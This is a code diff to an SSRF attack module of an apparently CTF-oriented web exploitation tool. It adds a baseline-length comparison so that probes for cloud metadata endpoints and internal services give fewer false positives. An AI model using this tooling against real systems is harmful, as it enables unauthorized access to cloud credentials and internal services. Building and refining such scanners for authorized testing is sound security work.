@@ -50,6 +50,22 @@ class SSRFAttack(BaseAttack):
         console.print(f"  [cyan][SSRF][/cyan] {method} {url} ?{param}")
         all_findings = []
 
+        # Baseline: send a non-resolvable URL as param value to see what "no SSRF" looks like.
+        # If the server is SSRF-vulnerable, real URLs return different content than the baseline.
+        baseline_len = -1
+        try:
+            _bl_resp, _ = await self._try_payload(method, url, param, "http://tweb-ssrf-baseline.invalid/")
+            if _bl_resp:
+                baseline_len = len(_bl_resp.text)
+        except Exception:
+            pass
+
+        def _differs_from_baseline(text: str) -> bool:
+            if baseline_len < 0:
+                return len(text) > 20
+            diff = abs(len(text) - baseline_len)
+            return diff > max(500, int(baseline_len * 0.15))
+
         if self.oob:
             token = self.oob.generate_token("ssrf")
             oob_payload = f"{self.oob.public_url}/{token}"
@@ -71,7 +87,7 @@ class SSRFAttack(BaseAttack):
             if self._should_stop():
                 break
             response, findings = await self._try_payload(method, url, param, metadata_url)
-            if response and len(response.text) > 20:
+            if response and _differs_from_baseline(response.text):
                 if any(hint in response.text.lower() for hint in ["ami-id", "instance", "metadata", "project"]):
                     console.print(f"  [bold red][SSRF][/bold red] Cloud metadata accessible! {metadata_url}")
                     findings.append({
@@ -79,18 +95,18 @@ class SSRFAttack(BaseAttack):
                         "value": f"Cloud metadata @ {metadata_url}: {response.text[:200]}",
                         "confidence": 0.95,
                     })
-                all_findings.extend(findings)
-                flag = has_definite_flag(findings)
-                if flag:
-                    console.print(f"  [bold green][SSRF][/bold green] FLAG: {flag}")
-                    self.stop_event.set()
-                    return all_findings
+                    all_findings.extend(findings)
+                    flag = has_definite_flag(findings)
+                    if flag:
+                        console.print(f"  [bold green][SSRF][/bold green] FLAG: {flag}")
+                        self.stop_event.set()
+                        return all_findings
 
         for internal_url in INTERNAL_SERVICES:
             if self._should_stop():
                 break
             response, findings = await self._try_payload(method, url, param, internal_url)
-            if response and len(response.text) > 20:
+            if response and _differs_from_baseline(response.text):
                 console.print(f"  [yellow][SSRF][/yellow] Internal service response: {internal_url}")
                 findings.append({
                     "type": "ssrf_internal_service",
@@ -107,7 +123,7 @@ class SSRFAttack(BaseAttack):
             if extra_url in CLOUD_METADATA_URLS or extra_url in INTERNAL_SERVICES:
                 continue
             response, findings = await self._try_payload(method, url, param, extra_url)
-            if response and len(response.text) > 20:
+            if response and _differs_from_baseline(response.text):
                 all_findings.extend(findings)
                 flag = has_definite_flag(findings)
                 if flag:
